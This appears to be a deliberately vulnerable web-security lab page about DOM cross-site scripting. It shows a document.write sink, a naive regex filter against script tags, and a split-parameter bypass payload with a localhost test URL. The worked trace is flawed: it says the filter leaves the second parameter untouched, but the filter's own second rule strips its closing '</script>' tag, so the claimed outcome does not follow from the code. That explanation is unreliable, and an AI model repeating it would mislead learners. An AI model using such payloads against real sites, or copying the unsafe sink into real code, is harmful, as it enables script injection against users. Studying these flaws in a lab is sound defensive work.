🛑 DOM XSS — Vulnerable Page

This page reads id and name from the URL query string and writes them directly into the DOM via document.write() — one of the most dangerous browser sinks.

1 ▸ Reflected Output (document.write sink)

The parameters are written here after passing through the legacy filter below.

2 ▸ Legacy String-Matching Filter

A naïve sanitize() function scans for the contiguous string <script> (case-insensitive) and replaces it with an empty string. This mirrors real-world WAF rules that rely on regex blocklists. 

function legacyFilter(input) {
  // Case-insensitive match for the literal tag <script>
  return input.replace(/<script\b[^>]*>/gi, "")
              .replace(/<\/script>/gi, "");
}

✗ This filter is trivially bypassable — see Section 3.

3 ▸ Double-Injection Bypass Technique

Because document.write() concatenates two separate URL parameters, an attacker can split the blocked tag across them. The filter inspects each parameter in isolation, sees no complete <script> tag in either one, and lets the payload through. After concatenation, the tag reassembles. 

// ──────────────────────────────────────────────────────────
// DOUBLE-INJECTION BYPASS PAYLOAD
// ──────────────────────────────────────────────────────────
//
// Craft the URL so each parameter holds HALF of the tag:
//
//   ?id=<scr&name=ipt>alert('XSS')</script>
//
// After the filter runs on each value independently:
//   legacyFilter("<scr")          → "<scr"       (no match)
//   legacyFilter("ipt>alert(…)")  → "ipt>alert(…)" (no match)
//
// document.write() concatenates them:
//   "<scr" + "ipt>alert('XSS')</script>"
//   = "<script>alert('XSS')</script>"   ← Executes!
//
// Full test URL (paste into browser address bar):
//   http://localhost:3000/vulnerable?id=<scr&name=ipt>alert('XSS')</script>
